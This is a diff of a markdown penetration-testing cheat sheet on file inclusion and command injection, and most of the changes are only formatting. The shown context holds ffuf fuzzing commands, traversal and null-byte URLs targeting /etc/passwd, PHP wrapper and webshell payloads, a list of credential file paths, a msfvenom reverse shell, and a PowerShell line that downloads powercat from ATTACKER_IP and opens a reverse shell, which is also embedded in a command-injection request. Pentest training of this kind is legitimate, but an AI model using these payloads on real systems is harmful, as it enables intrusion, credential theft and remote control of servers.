@@ -2,43 +2,43 @@
 
 Local File Inclusion (LFI) and Remote File Inclusion (RFI) are vulnerabilities that are often found to affect web applications that rely on a scripting run time. It allows someone to read/execute files on the server by exploiting file inclusion mechanisms.
 
->A File Inclusion Vulnerability refers to a type of security vulnerability in web applications, particularly prevalent in applications developed in PHP, where an attacker can include a file, usually exploiting a lack of proper input/output sanitization. This vulnerability can lead to a range of malicious activities, including code execution, data theft, and website defacement.
+> A File Inclusion Vulnerability refers to a type of security vulnerability in web applications, particularly prevalent in applications developed in PHP, where an attacker can include a file, usually exploiting a lack of proper input/output sanitization. This vulnerability can lead to a range of malicious activities, including code execution, data theft, and website defacement.
 
 # Local File Inclusion (LFI)
 
 ## Scanning for LFI
 
--   URL LFI **Example**:
+- URL LFI **Example**:
 
 ```bash
 http://<target_url>/file.php?recurse=<file_name>
 ```
 
--   **Normal Fuzzing**:
+- **Normal Fuzzing**:
 
 ```bash
 ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
 ```
 
--   **Fuzz `GET` Parameters**:
+- **Fuzz `GET` Parameters**:
 
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
 ```
 
--   **Fuzz PHP Files**:
+- **Fuzz PHP Files**:
 
 ```bash
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
 ```
 
--   **Fuzz Webroot**: to fuzz for index.php use [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [wordlist for windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt), or this [general wordlist alternative](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt); consider that depending on our LFI situation, we may need to add a few back directories (e.g. `../../../../`), and then add our index.php afterwords.
+- **Fuzz Webroot**: to fuzz for index.php use [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [wordlist for windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt), or this [general wordlist alternative](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt); consider that depending on our LFI situation, we may need to add a few back directories (e.g. `../../../../`), and then add our index.php afterwords.
 
 ```bash
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
 ```
 
--   **Fuzz Server Logs and Configs**: we can use the same wordlists as before.
+- **Fuzz Server Logs and Configs**: we can use the same wordlists as before.
 
 ```bash
 ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
@@ -50,7 +50,7 @@ Sometimes protections are in place to prevent directory traversal. These are com
 
 ```bash fold
 # URL encoding bypass
-http://<target_url>/file.php?recurse=../../../../../etc/passwd% 
+http://<target_url>/file.php?recurse=../../../../../etc/passwd%
 
 # Null byte injection bypass
 http://<target_url>/file.php?recurse=../../../../../etc/passwd?nullbyte
@@ -80,7 +80,7 @@ http://<target_url>/file.php?recurse=../../../../../proc/self/environ
 
 Wrappers are mechanisms that let you change the file processing behavior to reveal sensitive data or interact with server components:
 
--   **Base64 encode a file:**
+- **Base64 encode a file:**
 
 ```bash
 http://<target_url>/file.php?recurse=php://filter/convert.base64-encode/resource=<file_name>
@@ -89,13 +89,13 @@ http://<target_url>/file.php?recurse=php://filter/convert.base64-encode/resource
 echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
 ```
 
--   **ROT13 encoding:**
+- **ROT13 encoding:**
 
 ```bash
 http://<target_url>/file.php?recurse=php://filter/read=string.rot13/resource=<file_name>
 ```
 
--   **PHP Wrapper:**
+- **PHP Wrapper:**
 
 ```bash
 curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"
@@ -170,13 +170,13 @@ http://<target_url>/file.php?recurse=../../../../../proc/self/environ
 
 ## Useful Tools
 
--   **LFISuite**: A tool to automate exploitation of LFI vulnerabilities.
+- **LFISuite**: A tool to automate exploitation of LFI vulnerabilities.
 
 ```bash
 git clone https://github.com/D35m0nd142/LFISuite
 ```
 
--   **RFIScanner**: A simple Python-based RFI vulnerability scanner.
+- **RFIScanner**: A simple Python-based RFI vulnerability scanner.
 
 ```bash
 python rfiscanner.py <target_url>
@@ -227,13 +227,13 @@ Alternatively, you can use the payload `multi-os-php-reverse-shell.php`, which a
 
 ## Malicious WordPress Plugin Generators
 
--   [With Meterpreter](https://github.com/wetw0rk/malicious-wordpress-plugin)
--   [Without Meterpreter](https://github.com/Jsmoreira02/Pwn_Wordpress)
+- [With Meterpreter](https://github.com/wetw0rk/malicious-wordpress-plugin)
+- [Without Meterpreter](https://github.com/Jsmoreira02/Pwn_Wordpress)
 
 ## Reverse Shell Options
 
--   [Two Reverse Shell Options](https://rioasmara.com/2019/02/25/penetration-test-wordpress-reverse-shell/)
--   [WordPress Backdoor Exploit](https://pentaroot.com/exploit-wordpress-backdoor-theme-pages/)
+- [Two Reverse Shell Options](https://rioasmara.com/2019/02/25/penetration-test-wordpress-reverse-shell/)
+- [WordPress Backdoor Exploit](https://pentaroot.com/exploit-wordpress-backdoor-theme-pages/)
 
 ### PHP Webshell
 
@@ -271,15 +271,15 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT>
 /home/<user>/.ssh/id_rsa
 /home/<user>/.bash_history
 /etc/apache2/sites-available/000-default.conf
-/etc/httpd/logs/acces_log 
-/etc/httpd/logs/error_log 
-/var/www/logs/access_log 
-/var/www/logs/access.log 
-/usr/local/apache/logs/access_ log 
-/usr/local/apache/logs/access. log 
-/var/log/apache/access_log 
-/var/log/apache2/access_log 
-/var/log/apache/access.log 
+/etc/httpd/logs/acces_log
+/etc/httpd/logs/error_log
+/var/www/logs/access_log
+/var/www/logs/access.log
+/usr/local/apache/logs/access_ log
+/usr/local/apache/logs/access. log
+/var/log/apache/access_log
+/var/log/apache2/access_log
+/var/log/apache/access.log
 /var/log/apache2/access.log
 /var/log/access_log
 /proc/self/environ
@@ -377,7 +377,7 @@ C:\xampp\tomcat\conf\server.xml
 
 # PHP Wrappers
 
--   **`php://filter`**
+- **`php://filter`**
 
 ```bash
 curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"
@@ -386,7 +386,7 @@ curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource
 echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
 ```
 
--   **`php://data`**
+- **`php://data`**
 
 ```bash
 curl "http://<TARGET>/index.php?page=data://text/plain,<PHP_PAYLOAD>"
@@ -397,19 +397,19 @@ echo -n '<?php echo system($_GET["cmd"]); ?>' | base64
 
 # OS Command Injection
 
--   **Detect Windows Commands Execution:**
+- **Detect Windows Commands Execution:**
 
 ```bash
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```
 
--   **Download and Execute PowerCat Reverse Shell:**
+- **Download and Execute PowerCat Reverse Shell:**
 
 ```bash
 IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/powercat.ps1");powercat -c <ATTACKER_IP> -p <PORT> -e powershell
 ```
 
--   **Executing Command Injection:**
+- **Executing Command Injection:**
 
 ```bash
 curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACKER_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER_IP>%20-p%20<PORT>%20-e%20powershell' http://<TARGET>:<PORT>/archive
@@ -426,3 +426,4 @@ You could test for this at any point where there's a file path that could possib
 # References
 
 [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
+
